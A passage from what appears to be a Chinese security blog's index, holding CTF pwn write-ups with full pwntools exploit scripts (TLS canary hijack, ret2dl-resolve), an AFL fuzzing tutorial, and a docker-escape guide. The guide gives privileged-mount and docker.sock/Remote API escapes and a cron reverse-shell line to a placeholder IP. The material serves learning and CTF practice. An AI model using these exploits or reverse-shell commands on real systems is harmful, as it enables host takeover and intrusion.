b&#x27;\\x00&#x27;)+p64(setcontext_addr)payload = payload.ljust(0xa0, b&#x27;\\x00&#x27;) + \\    p64(rop_chain_addr)+p64(setcontext_addr+334-61)edit(4, payload)payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(free_hook)edit(2, payload[:-1])create(6, 1, p64(gadget)[:-1])delete(5)r.interactive()\n\n解法2：\n在我的这篇文章中，讲了另一个方式劫持栈，也就是通过environ泄漏栈地址，计算与main函数ret时的栈地址的偏移量进行劫持，这里主要是讲解gadget就不在赘述\n","categories":["pwn"],"tags":["堆利用技巧","tcache double free"]},{"title":"FUZZ(1):初探AFL","url":"/2023/03/18/%E5%88%9D%E6%8E%A2AFL/","content":"前言本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。\nAFL-FUZZ介绍AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。\n白盒下的FUZZ#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123;    int len = strlen(str);    if(str[0] == &#x27;A&#x27; &amp;&amp; len == 66)    &#123;        raise(SIGSEGV);        //如果输入的字符串的首字符为A并且长度为66，则异常退出    &#125;    else if(str[0] == &#x27;F&#x27; &amp;&amp; len == 6)    &#123;        raise(SIGSEGV);        //如果输入的字符串的首字符为F并且长度为6，则异常退出    &#125;    else    &#123;        printf(&quot;it is good!\\n&quot;);    &#125;    return 0;&#125;int main(int argc, char *argv[])&#123;    char buf[100]=&#123;0&#125;;    gets(buf);//存在栈溢出漏洞    printf(buf);//存在格式化字符串漏洞    vuln(buf);    return 0;&#125;\n\n大概流程：\n首先是用afl-gcc编译源代码进行插桩，然后以测试文件为输入，然后启动afl-fuzz程序，将testcase作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来\n编译插桩首先是面对上面这类小文件时采取的方法就是直接进行编译\nafl-gcc -g -o test test.c\n\n但是面对编译项目时，大多会使用到Makefile。如果存在configure的话肯定是可以在里面直接进行修改，如果没有的话可以直接修改Makefile或者添加以下内容:\nCC=/path/to/afl/afl-gccCXX=/path/to/afl/afl-g++\n\n 当然面对clang或者clang++的话也是一样的。\n开始FUZZ对那些可以直接从stdin读取输入的目标程序来说，语法如下：\n./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]\n\n对从文件读取输入的目标程序来说，要用“@@”，语法如下：\n./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@\n\n而对于这里命令为:afl-fuzz -i input_dir -o output_dir ./test\n其中-i选项时输入测试文件的目录，-o选项时输出结果文件的目录。\n对于这个简单的例子，测试文件只需要随便输入点东西就行，这里选择输入hello\n一般会出现上图中的问题，解决办法就是\nsudo suecho core &gt;/proc/sys/kernel/core_pattern\n\n\n上图就是AFL的界面，上面的内容根据前面的注释基本可以猜出来一二，不过跑了十分钟只跑出了五处crash就挺离谱的，这个跑的结果与testcase和电脑性能以及运气都有一定关系。\n分析crashesid:000000,sig:06,src:000001,op:havoc,rep:128样例➜  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......#..#......00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........#....00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............#..00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......#......#.00000070: 6410 0000 9b15                           d.....\n\n可以猜测为栈溢出\nid:000001,sig:06,src:000001,op:havoc,rep:128样例➜  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............\n\n一样的应该也是栈溢出导致的\nid:000002,sig:11,src:000000,op:flip1,pos:1样例➜  crashes xxd id:000002,sig:11,src:000000,op:flip1,pos:1  00000000: 7425 7374                                t%st\n\n这里应该是格式化字符串漏洞引起的crash\nid:000003,sig:11,src:000000,op:havoc,rep:64样例➜  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@00000030: 4040 3340 4040 4040 40                   @@3@@@@@@\n\n这里应该是以F开头且长度为6引起的crash\nid:000004,sig:11,src:000002,op:havoc,rep:8样例➜  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA200000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A400000040: 41b8                                     A.\n\n这里应该是以A开头并且长度为66引起的crash\n总结可以看到上面五个样例基本覆盖了源码中存在的漏洞。\n黑盒下的FUZZ\n  黑盒模式需要使用qemu_mode，所以最好从开始就使用源码进行编译，这里可能会出现很多问题，大多都可以在网上搜到解决办法\n\n这里直接使用以下命令进行编译。\ngcc -g ./test.c -o test\n\n开始FUZZ这里的FUZZ选项略有不同，需要加上-Q选项。\nafl-fuzz -i ./input_dir -o ./output_dir -Q ./test\n\n\n虽然可以看到这里被保存的crashes有6个，比上面的还多一个，但是看total crashes远远少于上面的。可以看出来用qemu的性能远远小于插桩的。\n这里就不再分析输出的crashes文件了。\n文件读取输入的情况首先做以下准备\n➜  input_dir mkdir file➜  input_dir cp ../../testcases/others/elf/small_exec.elf ./file➜  afl_test cp /usr/bin/readelf ./\n\n随后直接进行fuzz\n../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@\n\n跑了十分钟一次crash都没有的，当然跑再久应该也是一样的，这里就不再继续跑了。\n\n参考资料:    https://xz.aliyun.com/t/4314    https://www.cjovi.icu/fuzzing/1138.html\n","categories":["FUZZ"],"tags":["AFL","FUZZ"]},{"title":"劫持TLS结构","url":"/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/","content":"TLS的简单介绍我这里就不详细说明TLS的实现了，因为太复杂了(我没看懂)。具体实现过程可以参考https://dere.press/2020/10/18/glibc-tls/\n对于TLS其实是线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。\n对于TLS的变量是每一个线程所独有的，维护canary的TCB结构的也就是tls。他会在每一个线程申请自己的空间，并且在验证时也是拿自己线程所在的作比较，我们可以通过canary的实现来观察TCB结构体的位置。\n\n很好可以理解实在fs偏移28个位置的值作为canary。\n下面是TCB结构体的定义:\ntypedef struct&#123;void *tcb;/* Pointer to the TCB.Not necessarily thethread descriptor used by libpthread.*/dtv_t *dtv;void *self;/* Pointer to the thread descriptor.*/int multiple_threads;int gscope_flag;uintptr_t sysinfo;uintptr_t stack_guard;uintptr_t pointer_guard;unsigned long int vgetcpu_cache[2];/* Bit 0: X86_FEATURE_1_IBT.Bit 1: X86_FEATURE_1_SHSTK.*/unsigned int feature_1;int __glibc_unused1;/* Reservation of some values for the TM ABI.*/void *__private_tm[4];/* GCC split stack support.*/void *__private_ss;/* The lowest address of shadow stack,*/unsigned long long int ssp_base;/* Must be kept even if it is no longer used by glibc since programs,like AddressSanitizer, depend on the size of tcbhead_t.*/__128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));void *__padding[8];&#125; tcbhead_t;\n\n也可以看到在fs:28h的位置也就是stack_guard\nQ1: HGAME enter_the_evil_pwn_land检查保护\n当时就是这道题卡住了我感觉自己好菜没资格打比赛就没打了。\n解题思路unsigned __int64 __fastcall test_thread(void *a1)&#123;  int i; // [rsp+8h] [rbp-38h]  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v4; // [rsp+38h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 0xFFF; ++i )  &#123;    read(0, &amp;s[i], 1uLL);    if ( s[i] == 10 )      break;  &#125;  puts(s);  return __readfsqword(0x28u) ^ v4;&#125;\n\n题目的内容很简单，存在0x1000个字节的栈溢出，但是只有一次puts的机会。\n所以，按照以往思路覆盖canary的\\x00显然是不能够的，所以我们直接劫持TLS。\n\n可以看到canary的值是0xd491330997329e00。\n\n再看TCB结构体可以看到canary确实就在偏移为0x28的地址上。\n\n可以看到TCB结构体还正在栈上。因为我们是写入0x1000字节所以显然能到这个位置。\n\nread开始的位置距离TCB结构体的距离是0x840。\n综上得出exp:from pwn import *r = process(&#x27;./a.out&#x27;)elf = ELF(&#x27;./a.out&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi = 0x0000000000401363ret_addr = 0x000000000040101avuln_fun = elf.sym[&#x27;test_thread&#x27;]r.sendline(b&#x27;a&#x27;*0x20)r.recvline()fsbase = u64((b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;\\n&#x27;, drop=True)).ljust(8, b&#x27;\\x00&#x27;))print(hex(fsbase))payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(puts_got)+p64(puts_plt)+p64(vuln_fun)payload = payload.ljust(0x840)+p64(fsbase)*3+p64(0)*3r.sendline(payload)r.recvuntil(b&#x27;\\n&#x27;)puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))libc_base = puts_addr-libc.sym[&#x27;puts&#x27;]system_addr = libc_base+libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))gdb.attach(r)pop_rsi = libc_base + 0x0000000000027529pop_rdx_r12 = libc_base + 0x000000000011c371payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(pop_rsi)+p64(0) + \\    p64(pop_rdx_r12)+p64(0)*2+p64(libc.sym[&#x27;execve&#x27;]+libc_base)r.sendline(payload)r.interactive()\n\nQ2: BUUCTF-PWN gyctf_2020_bfnote保护检查\n这道题目需要昨天的re2dlresolve的知识，没看过的师傅可以去看看ret2dl-resolve\n解题思路unsigned int __cdecl main()&#123;  int i; // [esp+4h] [ebp-54h]  int size; // [esp+8h] [ebp-50h]  char *v3; // [esp+Ch] [ebp-4Ch]  int v4; // [esp+14h] [ebp-44h]  char s[50]; // [esp+1Ah] [ebp-3Eh] BYREF  unsigned int v6; // [esp+4Ch] [ebp-Ch]  v6 = __readgsdword(0x14u);  start_menu();  fwrite(&quot;\\nGive your description : &quot;, 1u, 0x19u, stdout);  memset(s, 0, sizeof(s));  read_0(0, s, 0x600);                          // 栈溢出  fwrite(&quot;Give your postscript : &quot;, 1u, 0x17u, stdout);  memset(&amp;unk_804A060, 0, 0x64u);  read_0(0, &amp;unk_804A060, 0x600);  fwrite(&quot;\\nGive your notebook size : &quot;, 1u, 0x1Bu, stdout);  size = input_int();  v3 = malloc(size);  memset(v3, 0, size);  fwrite(&quot;Give your title size : &quot;, 1u, 0x17u, stdout);  v4 = input_int();  for ( i = v4; size - 0x20 &lt; i; i = input_int() )    fwrite(&quot;invalid ! please re-enter :\\n&quot;, 1u, 0x1Cu, stdout);  fwrite(&quot;\\nGive your title : &quot;, 1u, 0x13u, stdout);  read_0(0, v3, i);                             fwrite(&quot;Give your note : &quot;, 1u, 0x11u, stdout);  read(0, &amp;v3[v4 + 16], size - v4 - 16);        // 任意地址写  fwrite(&quot;\\nnow , check your notebook :\\n&quot;, 1u, 0x1Du, stdout);  fprintf(stdout, &quot;title : %s&quot;, v3);  fprintf(stdout, &quot;note : %s&quot;, &amp;v3[v4 + 16]);  return __readgsdword(0x14u) ^ v6;&#125;\n\n别人可以用tls直接查看这个地址，但是我试了几次都不行所以就用了search查找canary来查找\n\n可以看到他存放的位置其实是共享映射区域，所以他的相对偏移是固定的。所以如果我们malloc一个很大的chunk(size&gt;=0x20000)，那么系统就被迫使用mmap给我们分配，根据mmap的机制我们分配的chunk就一定在tcbhead_t地址的低地址处。再根据上面main函数的漏洞就很容易修改掉canary的值了。\n思路就是分配一个大小为0x20000的堆块到canary上面去，然后计算他们之间偏移，利用上面的任意地址写修改canary的值。但是由于题目当中的输出函数是fwrite或者fprintf。我们的ROPgadget不够，所以选择使用ret2dl-resolve。\n这道题恶心人的一点\n\n在main函数最后并不是普通的leave  retn，在最后的时候esp的值会变到ebp+var_4-4的值，所以在构造ROP的时候不能在栈上面构造。\n最终得到exp:from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28441)# r = process(&quot;./gyctf_2020_bfnote&quot;)elf = ELF(&quot;./gyctf_2020_bfnote&quot;)libc = ELF(&#x27;../buu_libc/x86/libc-2.23.so&#x27;)bss_start = 0x0804A060gap = 0x500stack_overflow = b&#x27;a&#x27; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)r.recvuntil(b&#x27;Give your description : &#x27;)r.send(stack_overflow)r.recvuntil(b&#x27;Give your postscript : &#x27;)fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + \\    p32(0) + p32(0) + p32(0x12)fake_rel = p32(bss_start) + p32(0x7 + ((bss_start + gap + 0x4 *                                        4 + 0x8 + 0x8 + 0x8 - 0x080481D8) // 0x10) * 0x100)r.send(b&#x27;\\x00&#x27; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) +       p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#x27;/bin/sh\\x00&#x27; + b&#x27;system\\x00\\x00&#x27; + fake_rel + fake_sym)r.recvuntil(b&#x27;Give your notebook size : &#x27;)r.send(bytes(str(0x20000), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;Give your title size : &#x27;)r.send(bytes(str(0xf7d22714 - 0xf7d01008 - 16), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;invalid ! please re-enter :\\n&#x27;)r.send(b&#x27;4&#x27;)r.recvuntil(&#x27;Give your title : &#x27;)r.send(&#x27;a&#x27;)r.recvuntil(&#x27;Give your note : &#x27;)r.send(&#x27;aaaa&#x27;)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104479071\n(我挺喜欢这个博主的不过他这次是伪造的link_map把我都看蒙了，后面发现都用的p32那就用32位的方式伪造呗，这样简便很多)\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve","劫持TLS结构"]},{"title":"浅尝docker escape","url":"/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/","content":"前言近期因为工作上的内容比较多压得比较紧所以一直没有去学习新的东西，也没有更新博客。所以最近呢也就挑一个比较简单一点的东西学了一下。在紧跟着的下一篇文章可能是关于syzkaller的，或者就是我前阵子分析的Stack Rot，时间多的话可能还会去更新一下Rootkit。\n这里会介绍因为配置问题引起的逃逸，但是更多的会讲解如何利用内核漏洞实现逃逸，以及通过内核漏洞实现逃逸的原理。\nLinux  kernel namespace机制Linux Namespaces机制提供一种资源隔离方案。PID,IPC,Network等系统资源不再是全局性的，而是属于某个特定的Namespace。每个namespace下的资源对于其他namespace下的资源都是透明，不可见的。因此在操作系统层面上看，就会出现多个相同pid的进程。系统中可以同时存在两个进程号为0,1,2的进程，由于属于不同的namespace，所以它们之间并不冲突。而在用户层面上只能看到属于用户自己namespace下的资源，例如使用ps命令只能列出自己namespace下的进程。这样每个namespace看上去就像一个单独的Linux系统。\n\nLinux kernel中namespace结构体当前Linux支持以下八种namespace，具体的含义这里就不过多赘述了，网上存在很多相关资料。\nstruct nsproxy &#123;\tatomic_t count;\tstruct uts_namespace *uts_ns;\tstruct ipc_namespace *ipc_ns;\tstruct mnt_namespace *mnt_ns;\tstruct pid_namespace *pid_ns_for_children;\tstruct net \t     *net_ns;\tstruct time_namespace *time_ns;\tstruct time_namespace *time_ns_for_children;\tstruct cgroup_namespace *cgroup_ns;&#125;;\n\n这里更多关注的是namespace与进程之间的关系，既然这么说那么肯定是存在关系的，我们又知道的是内核中使用的是task_struct结构体描述当前进程的状态，那么势必在其结构体汇总存在一个成员是与namespace相关的。\nstruct task_struct &#123;\t// ... ...\t/* Process credentials: */\t/* Tracer&#x27;s credentials at attach: */\tconst struct cred __rcu\t\t*ptracer_cred;\t/* Objective and real subjective task credentials (COW): */\tconst struct cred __rcu\t\t*real_cred;\t/* Effective (overridable) subjective task credentials (COW): */\tconst struct cred __rcu\t\t*cred;#ifdef CONFIG_KEYS\t/* Cached requested key. */\tstruct key\t\t\t*cached_requested_key;#endif\t/*\t * executable name, excluding path.\t *\t * - normally initialized setup_new_exec()\t * - access it with [gs]et_task_comm()\t * - lock it with task_lock()\t */\tchar\t\t\t\tcomm[TASK_COMM_LEN];\tstruct nameidata\t\t*nameidata;#ifdef CONFIG_SYSVIPC\tstruct sysv_sem\t\t\tsysvsem;\tstruct sysv_shm\t\t\tsysvshm;#endif#ifdef CONFIG_DETECT_HUNG_TASK\tunsigned long\t\t\tlast_switch_count;\tunsigned long\t\t\tlast_switch_time;#endif\t/* Filesystem information: */\tstruct fs_struct\t\t*fs;\t/* Open file information: */\tstruct files_struct\t\t*files;#ifdef CONFIG_IO_URING\tstruct io_uring_task\t\t*io_uring;#endif\t/* Namespaces: */\tstruct nsproxy\t\t\t*nsproxy;\t// ... ...&#125;\n\n可以看到存在一个成员为nsproxy的指针，其指向的就是nsproxy结构体。并且相比各位应该能够注意到在nsproxy结构体中的count成员，这个成员在内核的很多结构体中都存在，一般被当作被引用的次数，那么这里的这个成员也是同样的含义。一般出现这样一个成员就代表该结构可以被多个地方使用，那么对于这里来说就是多个进程可以使用同一个nsproxy结构体。\nstruct nsproxy init_nsproxy = &#123;\t.count\t\t\t= ATOMIC_INIT(1),\t.uts_ns\t\t\t= &amp;init_uts_ns,#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)\t.ipc_ns\t\t\t= &amp;init_ipc_ns,#endif\t.mnt_ns\t\t\t= NULL,\t.pid_ns_for_children\t= &amp;init_pid_ns,#ifdef CONFIG_NET\t.net_ns\t\t\t= &amp;init_net,#endif#ifdef CONFIG_CGROUPS\t.cgroup_ns\t\t= &amp;init_cgroup_ns,#endif#ifdef CONFIG_TIME_NS\t.time_ns\t\t= &amp;init_time_ns,\t.time_ns_for_children\t= &amp;init_time_ns,#endif&#125;;\n\n然而在内核中存在一个默认的nsproxy，即为上面的init_nsproxy\nstruct task_struct init_task#ifdef CONFIG_ARCH_TASK_STRUCT_ON_STACK\t__init_task_data#endif\t__aligned(L1_CACHE_BYTES)= &#123;#ifdef CONFIG_THREAD_INFO_IN_TASK\t.thread_info\t= INIT_THREAD_INFO(init_task),\t.stack_refcount\t= REFCOUNT_INIT(1),#endif\t.__state\t= 0,\t.stack\t\t= init_stack,\t.usage\t\t= REFCOUNT_INIT(2),\t.flags\t\t= PF_KTHREAD,\t.prio\t\t= MAX_PRIO - 20,\t.static_prio\t= MAX_PRIO - 20,\t.normal_prio\t= MAX_PRIO - 20,\t.policy\t\t= SCHED_NORMAL,\t.cpus_ptr\t= &amp;init_task.cpus_mask,\t.user_cpus_ptr\t= NULL,\t.cpus_mask\t= CPU_MASK_ALL,\t.nr_cpus_allowed= NR_CPUS,\t.mm\t\t= NULL,\t.active_mm\t= &amp;init_mm,\t.restart_block\t= &#123;\t\t.fn = do_no_restart_syscall,\t&#125;,\t.se\t\t= &#123;\t\t.group_node \t= LIST_HEAD_INIT(init_task.se.group_node),\t&#125;,\t.rt\t\t= &#123;\t\t.run_list\t= LIST_HEAD_INIT(init_task.rt.run_list),\t\t.time_slice\t= RR_TIMESLICE,\t&#125;,\t.tasks\t\t= LIST_HEAD_INIT(init_task.tasks),#ifdef CONFIG_SMP\t.pushable_tasks\t= PLIST_NODE_INIT(init_task.pushable_tasks, MAX_PRIO),#endif#ifdef CONFIG_CGROUP_SCHED\t.sched_task_group = &amp;root_task_group,#endif\t.ptraced\t= LIST_HEAD_INIT(init_task.ptraced),\t.ptrace_entry\t= LIST_HEAD_INIT(init_task.ptrace_entry),\t.real_parent\t= &amp;init_task,\t.parent\t\t= &amp;init_task,\t.children\t= LIST_HEAD_INIT(init_task.children),\t.sibling\t= LIST_HEAD_INIT(init_task.sibling),\t.group_leader\t= &amp;init_task,\tRCU_POINTER_INITIALIZER(real_cred, &amp;init_cred),\tRCU_POINTER_INITIALIZER(cred, &amp;init_cred),\t.comm\t\t= INIT_TASK_COMM,\t.thread\t\t= INIT_THREAD,\t.fs\t\t= &amp;init_fs,\t.files\t\t= &amp;init_files,#ifdef CONFIG_IO_URING\t.io_uring\t= NULL,#endif\t.signal\t\t= &amp;init_signals,\t.sighand\t= &amp;init_sighand,\t.nsproxy\t= &amp;init_nsproxy,\t// ... ...&#125;;EXPORT_SYMBOL(init_task);\n\n其会被直接加载进入到init_task之中。\n在Linux系统中，PID为1的进程被称为init进程，系统中的所有进程都是通过init进程直接或者间接fork而来的。自然而然，宿主机上没有经过容器化的进程，他们位于同一组namespace中，所以会共享同一个struct nsproxy结构体，如下图，容器内的进程的namespace与其余进程不一致。\n\n于是乎可以得出这样的结论，如果可以把容器内的exp进程的nsproxy修改为init_proxy就可以实现突破，达到逃逸的目的了。\nDocker 环境判断查找 .dockerenv 文件docker下默认存在dockerenv文件，而非docker环境中则没有\n\n查询 cgroup 进程\nDocker 逃逸特权模式逃逸以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。\nroot@7fbc86e39373:~# docker run -it --privileged 镜像id /bin/bash\n\nroot@7fbc86e39373:~# fdisk -l# ... ...Disk /dev/sda: 64 GiB, 68719476736 bytes, 134217728 sectorsDisk model: Ubuntu Linux 20.Units: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 4096 bytesI/O size (minimum/optimal): 4096 bytes / 4096 bytesDisklabel type: dosDisk identifier: 0x1f305916Device     Boot   Start       End   Sectors  Size Id Type/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32/dev/sda2       1052670 134215679 133163010 63.5G  5 Extended/dev/sda5       1052672 134215679 133163008 63.5G 83 Linux# ... ...\n\nroot@7fbc86e39373:~# mkdir /testroot@7fbc86e39373:~# mount /dev/sda5 /test\n\n最终写入计划任务到宿主机实现反弹shell\necho &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root\n\n如何判断是否为特权模式在suid提权中SUID设置的程序出现漏洞就非常容易被利用，所以 Linux 引入了 Capability 机制以此来实现更加细致的权限控制，从而增加系统的安全性。\n在 https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md 链接中汇总了特权模式下添加了什么功能。\n除此之外还需具有以下条件\n\n  必须缺少AppArmor配置文件，否则将允许mount syscall\n  能够“看到”很多敏感的dev设备\n\n上述两个条件目前还不知道如何获取，所以重点看下特权容器中获取的 Cap 集合\nroot@7fbc86e39373:~/test# cat /proc/1/status | grep CapCapInh:\t0000000000000000CapPrm:\t000001ffffffffffCapEff:\t000001ffffffffffCapBnd:\t000001ffffffffffCapAmb:\t0000000000000000\n\nCapEff 主要是检查线程的执行权限，所以重点看下利用 capsh --decode=0000001fffffffff 进行解码，检索默认没有添加的 NET_ADMIN，发现存在cap_net_admin\nroot@7fbc86e39373:~/test# capsh --decode=0000001fffffffff0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend\n\n而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN\ndocker.sock 挂载逃逸Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon(docker守护进程)扮演，二者之间通信方式有以下3种：\nunix:///var/run/docker.socktcp://host:portfd://socketfd\n\n其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。\n逃逸的方法主要是以下操作：\n运行一个挂载/var/run/的容器\ndocker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash\n\n寻找下挂载的sock文件\nfind / -name docker.sock\n\n在容器内安装client，即docker\napt update &amp;&amp; apt install docker.io\n\n查看宿主机docker信息并运行一个新容器并挂载宿主机根路径\ndocker -H unix:///host/var/run/docker.sock info\n\ndocker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash\n\n写入计划任务反弹shell\necho &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root\n\nRemote API未授权访问docker swarm中默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。\n当使用官方推荐启动方式时\ndockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375\n\n在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。此时访问/containers/json，便会得到所有容器id字段。创建一个 exec：\nPOST /containers/&lt;container_id&gt;/exec HTTP/1.1Host: &lt;docker_host&gt;:PORTContent-Type: application/jsonContent-Length: 188&#123;  &quot;AttachStdin&quot;: true,  &quot;AttachStdout&quot;: true,  &quot;AttachStderr&quot;: true,  &quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],  &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,  &quot;Privileged&quot;: true,  &quot;Tty&quot;: true&#125;\n\n发包后返回exec的id参数\nPOST /exec/&lt;exec_id&gt;/start HTTP/1.1Host: &lt;docker_host&gt;:PORTContent-Type: application/json&#123; &quot;Detach&quot;: false, &quot;Tty&quot;: false&#125;\n\n执行exec中的命令，成功读取passwd文件，这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸。\n在容器内安装docker，查看宿主机docker镜像信息\ndocker -H tcp://ip:2375 images\n\n启动一个容器并将宿主机根目录挂在到容器的test目录，最后又是写计划任务。\ndocker -H tcp://ip:2375 run -it -v /:/test 5d2df19066ac /bin/bash\n\n利用内核漏洞逃逸众所周知的是，docker的容器其实是和宿主机公用同一套内核的，所以如果内存出现漏洞是完全可以进行逃逸的，并且在前面的提到的namespace机制我们可以得知的是进程的task_truct中使用的是nsproxy成员实现的隔离机制，如果我们能够修改这个成员那么就可以完成逃逸了。\n这里针对内核提权过程中的两种情况分别给一下对应的解决办法，在以往的kernel pwn中我们最为熟知的两种提权方式是：\n一、 控制程序执行流\n二、 存在任意地址写\n首先是第一种情况，如果可以直接控制rip的话可以直接调用如下函数：\nvoid switch_task_namespaces(struct task_struct *p, struct nsproxy *new)&#123;\tstruct nsproxy *ns;\tmight_sleep();\ttask_lock(p);\tns = p-&gt;nsproxy;\tp-&gt;nsproxy = new;\ttask_unlock(p);\tif (ns)\t\tput_nsproxy(ns);&#125;\n\n通过名字和参数可以猜出来该函数的作用就是修改指定task_struct的nsproxy为执行的nsproxy结构体。\n那么第二种情况的时候利用起来也很简单，只需要直接修改当前task_struct的nsproxy为init_proxy即可实现逃逸。\n\n参考链接：\n​    https://xz.aliyun.com/t/12495#toc-3\n","categories":["Linux Kernel"],"tags":["docker 